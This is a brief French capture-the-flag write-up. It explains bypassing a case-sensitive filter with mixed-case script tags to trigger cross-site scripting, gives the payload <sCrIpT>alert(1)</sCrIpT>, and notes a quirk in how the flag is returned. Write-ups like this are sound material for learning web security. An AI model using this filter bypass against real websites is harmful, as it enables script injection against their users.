En changeant les balises en `script` en: `sCrIpT` nous avons une xss:

payload:
```
<sCrIpT>alert(1)</sCrIpT>
```

logiquement la faille s'arrete la et on devrait avoir le flag.

mais il faut envoyer "a" ou "script" sans "<" et ">" pour que le flag soit retouner.
